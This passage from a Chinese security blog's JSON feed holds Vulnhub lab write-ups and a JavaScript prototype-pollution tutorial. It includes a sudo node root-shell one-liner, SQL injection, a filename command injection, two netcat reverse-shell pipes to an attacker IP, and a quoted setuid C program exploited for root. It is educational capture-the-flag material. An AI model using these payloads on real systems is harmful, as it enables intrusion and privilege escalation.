权限</p>\n<h3 id=\"二次提权\"><a class=\"anchor\" href=\"#二次提权\">#</a> 二次提权</h3>\n<p>还是刚刚提到的三种提权方式，内核，suid，sudo 三种方式，分别查看后，发现这里 sudo 有配置漏洞</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120515989.png\" alt=\"image-20230715120515989\" /></p>\n<p>这里使用 node 来进行提权</p>\n<pre><code class=\"language-perl\">sudo node -e 'child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)'\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120756692.png\" alt=\"image-20230715120756692\" /></p>\n<p>这里提权成功，这里还是到家目录，这里还有一个 flag，也能拿到 root 的权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120835250.png\" alt=\"image-20230715120835250\" /></p>\n<p>到这里就算是结束了，总的来说收货很多，但是对于 nodejs 的利用好像不是特别明显哈，也是去<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXl1bWVuLmdpdGh1Yi5pby8yMDIyLzA0LzE2LzIwMjItMDQtMTYtQ1ZFLTIwMjAtNzY5OS8=\"> CVE-2020-7699 复现・SUYUMEN</span> 这位师傅的博客去学习了一下</p>\n",
            "tags": [
                "Vulnhub",
                "Vulnhub"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/",
            "title": "记一次easy_cloudantivirus打靶记录",
            "date_published": "2023-07-13T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>上一篇文章记录了我学习 JavaScript 原型链有关的知识点，这里再开台简单的靶机调和一下思路，地址也贴在这里<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm9yZWRoYWNrZXJibG9nLWNsb3VkLWF2LDQ1My8=\"> BoredHacker 博客：Cloud AV ~ VulnHub</span></p>\n<h2 id=\"靶机描述\"><a class=\"anchor\" href=\"#靶机描述\">#</a> 靶机描述</h2>\n<p>云反病毒扫描程序！是一种基于云的防病毒扫描服务。</p>\n<p>目前，它处于测试模式。系统要求您测试设置并查找漏洞并升级隐私。</p>\n<p>难度：简单</p>\n<p>涉及的任务：</p>\n<ul>\n<li>端口扫描</li>\n<li>网页应用攻击</li>\n<li>SQL 注入</li>\n<li>命令注入</li>\n<li>暴力破解</li>\n<li>代码分析</li>\n</ul>\n<p>虚拟机：</p>\n<ul>\n<li>格式： 虚拟机 （Virtualbox OVA）</li>\n<li>操作系统： Linux.</li>\n</ul>\n<p>联网：</p>\n<ul>\n<li>DHCP 服务：已启用</li>\n<li>IP 地址自动分配</li>\n</ul>\n<h2 id=\"攻击流程\"><a class=\"anchor\" href=\"#攻击流程\">#</a> 攻击流程</h2>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p>这里我都是使用的桥接模式，直接扫描当前网段</p>\n<pre><code class=\"language-perl\">nmap  192.168.13.0/24 \n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714150949929.png\" alt=\"image-20230714150949929\" /></p>\n<p>这里可以看到开放了 22 和 8080 端口，接下来对端口进行一个服务发现</p>\n<pre><code class=\"language-perl\">nmap  -p22,8080 -sV 192.168.13.184\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714151232281.png\" alt=\"image-20230714151232281\" /></p>\n<p>这里可以看到 8080 上是开放了一个 web 服务，使用了 workzeug 框架，使用的 python 版本 2.7.15</p>\n<p>接下使用浏览器尝试去访问 8080 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714151457966.png\" alt=\"image-20230714151457966\" /></p>\n<p>这是一个云防病毒的查杀服务，这里我们需要有一个邀请码才能正常使用服务，这里能想到的方法有两种暴力破解和注入</p>\n<p>这里先给火狐浏览器的代理指向 burp 的监听端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714151938572.png\" alt=\"image-20230714151938572\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714152349789.png\" alt=\"image-20230714152349789\" /></p>\n<p>这里发现输入 &quot; 的时候会抛出一个异常</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714152655817.png\" alt=\"image-20230714152655817\" /></p>\n<h3 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<p>这里抛出的异常很明显是存在 sql 注入</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153019079.png\" alt=\"image-20230714153019079\" /></p>\n<p>这里使用万能密码就可以，这里直接用浏览器发送请求</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153227998.png\" alt=\"image-20230714153227998\" /></p>\n<p>这个页面就是一个防病毒的扫描文件了，这里熟悉 linux 的应该第一反应就是这是通过 ll 命令查看到的内容，很显然这些文件就是放在服务端上面的文件，这里我们提交文件名这里后台应该是对我们传入的文件名进行了一些操作，这里猜想可能是命令注入就尝试了一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153823101.png\" alt=\"image-20230714153823101\" /></p>\n<p>这里尝试读取文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153809407.png\" alt=\"image-20230714153809407\" /></p>\n<p>能够成功读取，那么很显然这里的逻辑大概是./filename xxx (xxx 是我们传入的文件名，filename 是查杀病毒的可执行文件)</p>\n<h3 id=\"nc反弹shell\"><a class=\"anchor\" href=\"#nc反弹shell\">#</a> nc 反弹 shell</h3>\n<p>那么接下来就可以进行反弹 shell，开始我也是用 nc 尝试了半天，但是一直没法成功，这里我也是去问了一下大师傅，才知道有些版本的 nc 是没有 - e 参数的</p>\n<pre><code class=\"language-perl\">cat;nc 192.168.13.249 1234 | /bin/bash | nc 192.168.13.249 2345\n</code></pre>\n<p>这里先通过 nc 监听一个端口，然后通过管道符将第一个连接的后续输入都发送给 /bin/bash，然后将执行的结果通过管道符发送给另一个端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714161309893.png\" alt=\"image-20230714161309893\" /></p>\n<p>这里 1234 端口输入的内容</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714161330489.png\" alt=\"image-20230714161330489\" /></p>\n<p>2345 会输出被 /bin/bash 解析后的内容</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714161406931.png\" alt=\"image-20230714161406931\" /></p>\n<p>这里可以看到，这个数据库文件似乎是有点奇怪的，这里使用 file 命令查看一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714162027441.png\" alt=\"image-20230714162027441\" /></p>\n<p>这是一个 SQLLite 的数据库文件，这里将这个文件 down 下来再本地运行一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714162251815.png\" alt=\"image-20230714162251815\" /></p>\n<p>这里使用 sqlite3 运行这个数据库文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714162512372.png\" alt=\"image-20230714162512372\" /></p>\n<p>这里插入了四条数据到数据库中，这里之前在命令注入的地方查看了 /etc/passwd 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153809407.png\" alt=\"image-20230714153809407\" /></p>\n<p>这里可以看见只有 root，cloudav 和 scanner 是可以通过 shell 登录系统，这里用这几个用户去尝试 ssh 登录</p>\n<p>这里分别生成字典然后通过 hydra 尝试登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714163309903.png\" alt=\"image-20230714163309903\" /></p>\n<p>好吧这里并不是登录密码，这里接着去收集信息</p>\n<p>在上一级目录中发现了一个可能可以利用的文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714163821666.png\" alt=\"image-20230714163821666\" /></p>\n<p>这里很显然，update_cloudav.c 是源码文件，update_cloudav 是可执行文件，他的所有者是 root，且可执行，这里的想法就是执行这个文件，然后进行命令注入</p>\n<pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char *argv[]) &#123;\n    char *freshclam = &quot;/usr/bin/freshclam&quot;; // freshclam 命令的路径\n\n    if (argc &lt; 2) &#123;\n        printf(&quot;This tool lets you update antivirus rules\\nPlease supply command line arguments for freshclam\\n&quot;);\n        return 1;\n    &#125;\n\n    // 构建完整的命令行\n    char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);\n    sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);\n\n    setgid(0); // 设置有效组ID为0，即root用户组\n    setuid(0); // 设置有效用户ID为0，即root用户\n    system(command); // 执行 freshclam 命令\n\n    return 0;\n&#125;\n\n</code></pre>\n<p>这个程序总的来说就如果你有参数就能够正常执行病毒库更新的一个操作，这里还是进行一个命令注入来反弹 shell</p>\n<pre><code class=\"language-perl\">./update_cloudav &quot;a;nc 192.168.13.249 6666|/bin/bash|nc 192.168.13.249 7777&quot;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714164840036.png\" alt=\"image-20230714164840036\" /></p>\n<p>这样就算是成功了</p>\n",
            "tags": [
                "Vulnhub",
                "Vulnhub"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/14/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "url": "https://blog.xcu.icu/2023/07/14/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "title": "JavaScript原型链污染",
            "date_published": "2023-07-13T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>最近总是遇到原型链污染的题目，之前也是没有接触到这一块，下来后去翻了翻这块的文章学习一下，这里做一个简单的记录</p>\n<h2 id=\"什么是原型链污染\"><a class=\"anchor\" href=\"#什么是原型链污染\">#</a> 什么是原型链污染</h2>\n<p>学习之前我们至少需要知道原型链污染是一个什么样的东西，原型链污染主要发生在 JavaScript 的运行过程中，攻击者可以通过原型链污染来控制对象属性的值，篡改应用服务的逻辑，甚至进行代码执行</p>\n<h2 id=\"前置知识\"><a class=\"anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<h3 id=\"什么是原型\"><a class=\"anchor\" href=\"#什么是原型\">#</a> 什么是原型</h3>\n<p>原型链污染当然是绕不开原型这个主角，那么什么是原型呢，先看这样一个例子</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>type<span class=\"token operator\">=</span><span class=\"token string\">\"string\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">demo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输出demo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>a<span class=\"token punctuation\">.</span><span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711154452628.png\" alt=\"image-20230711154452628\" /></p>\n<p>在 JavaScript 中，如果我们需要定义一个类，需要通过定义 “构造函数” 的方式来构造，类中的方法我们可以定义在构造函数内部，这里是能够正常使用的，再看下面这个例子</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>type<span class=\"token operator\">=</span><span class=\"token string\">\"string\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">Clown</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">demo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">let</span> clown <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>clown<span class=\"token punctuation\">.</span><span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711160502070.png\" alt=\"image-20230711160502070\" /></p>\n<p>这里好像都是能够正常调用的，那么既然已经有了第一种定义方法的方式为什么还要有第二种呢？大致有下面几种原因</p>\n<ol>\n<li>内存占用：使用原型定义方法可以使得所有实例共享相同的方法。而直接在构造函数中定义方法会在每个实例上创建方法的副本，导致内存占用增加，尤其在创建大量实例时。</li>\n<li>动态性：通过原型定义方法，可以在运行时动态地更新所有实例的方法。当你修改原型对象上的方法时，所有实例都会受到影响。而如果直接在构造函数中定义方法，你需要重新创建实例才能使用更新后的方法。</li>\n<li>继承和多态性：使用原型链继承，可以通过指定一个对象的原型为另一个对象来实现继承和多态性。这样可以在继承链中共享和重写方法。直接在构造函数中定义方法不能轻松实现继承和多态性的概念</li>\n</ol>\n<p>基于这些优点，越是体系大的应用体系中越是明显，所以原型的使用还是非常有必要的</p>\n<p>值得注意的是，实例化的对象想要使用原型定义是不被运行的，比如下面这个例子</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>type<span class=\"token operator\">=</span><span class=\"token string\">\"string\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">Clown</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">demo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token class-name\">Clown</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token string\">\"aaaaa\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">let</span> clown <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>clown<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token string\">\"bbbb\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>clown<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>clown<span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>运行结果</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230712121942961.png\" alt=\"image-20230712121942961\" /></p>\n<p>这里先通过 Clown 类去通过 prototype 定义是被允许的，同样也能够通过实例化后的对象去访问，但是想要通过实例化后的对象去定义一个原型出现了报错，有没有办法解决这个问题呢？当然是有的，__proto__这样一个东西就出现了，看下面这样一个例子</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>type<span class=\"token operator\">=</span><span class=\"token string\">\"string\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">Clown</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">demo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">let</span> clown <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Clown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Clown</span><span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">===</span> clown<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230712123438919.png\" alt=\"image-20230712123438919\" /></p>\n<p>总结（摘自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1sIzB4MDItamF2YXNjcmlwdA==\"> https://www.leavesongs.com</span>）<br />\n1、prototype 是一个类的属性，所有类对象在实例化的时候将会拥有 prototype 中的属性和方法<br />\n 2、一个对象的__proto__属性，指向这个对象所在的类的 prototype 属性</p>\n<h3 id=\"原型链继承\"><a class=\"anchor\" href=\"#原型链继承\">#</a> 原型链继承</h3>\n<p>先看这样一个例子</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Father</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>first_name <span class=\"token operator\">=</span> <span class=\"token string\">'Donald'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>last_name <span class=\"token operator\">=</span> <span class=\"token string\">'Trump'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Son</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>first_name <span class=\"token operator\">=</span> <span class=\"token string\">'Melania'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">Son</span><span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Father</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">let</span> son <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Son</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Name: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>son<span class=\"token punctuation\">.</span>first_name<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>son<span class=\"token punctuation\">.</span>last_name<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230712220447625.png\" alt=\"image-20230712220447625\" /></p>\n<p>这里就和 java 的继承很像，这里最后输出的是 Name: Melania Trump，很显然这里 Son 是没有 last_name 这个属性</p>\n<p>这里在调用 son.last_name 时首先会在 Son 中寻找，如果找不到就会在 Son.__proto__中寻找，找不到再去 Son.__proto__.__proto__寻找，直到找到 null 结束</p>\n<pre><code class=\"language-JavaScript\">function Father() &#123;\n    this.first_name = 'Donald'\n    this.last_name = 'Trump'\n&#125;\n\nfunction Son() &#123;\n    this.first_name = 'Melania'\n&#125;\n\nSon.prototype = new Father()\n\nlet son = new Son()\nconsole.log(son.__proto__)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230712221435818.png\" alt=\"image-20230712221435818\" /></p>\n<p>这里找到就会直接去调用</p>\n<h2 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p>进过前面的学习，对 nodejs 的原型和原型链继承有了一个了解，接下来的篇幅正片开始</p>\n<p>PS：这里 node 是 JavaScript 是运行环境，上面这些代码都可以在浏览器的控制台运行，这里我使用的是 WebStorm</p>\n<p>看先面这个例子</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token literal-property property\">test</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"a\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a<span class=\"token punctuation\">.</span> __proto__<span class=\"token punctuation\">.</span>test<span class=\"token operator\">=</span><span class=\"token string\">\"b\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>qqqq<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>test<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">let</span> b <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>test<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230712222759968.png\" alt=\"image-20230712222759968\" /></p>\n<p>这里可以看见，值为空的 b，也能通过 b.test 去输出一个值，首先这里定义了一个 a，a 是一个 Object 类的实例，然后修改了原型 a. __proto__.test=&quot;b&quot;，他实际等于 Object.prototype.test  = &quot;b&quot;，所以 b 这个对象自然也就有了 test 属性</p>\n<p>像这样，控制修改一个对象的原型，导致所有和这个对象来自同一个类、父祖类的对象都被修改就叫做原型链污染，简单来说被 new 出来的实例会通过__proto__影响到原来的类</p>\n<h2 id=\"巩固\"><a class=\"anchor\" href=\"#巩固\">#</a> 巩固</h2>\n<p>只有理论是行不通滴，这里找几道题来练习一下</p>\n<h3 id=\"catctf-2022-wife_wife\"><a class=\"anchor\" 